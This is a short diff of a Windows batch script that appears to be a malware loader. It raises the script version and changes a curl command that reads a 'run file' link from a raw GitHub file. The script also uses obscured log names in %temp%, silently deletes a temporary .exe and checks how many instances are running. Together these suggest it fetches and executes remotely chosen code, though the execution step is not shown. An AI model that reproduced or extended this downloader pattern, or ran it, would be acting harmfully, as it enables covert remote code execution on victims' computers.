@@ -32,7 +32,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=48.4"
+set "BATCHVERSION=48.5"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -390,7 +390,7 @@ del /f /a /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
  
 echo. >> "%LOGFILE%" 2>&1
  
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerForRunEveryRunning') do set "RUNFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerForRunEveryRunningT') do set "RUNFILELINK=%%i"
 
 echo. >> "%LOGFILE%" 2>&1
 echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
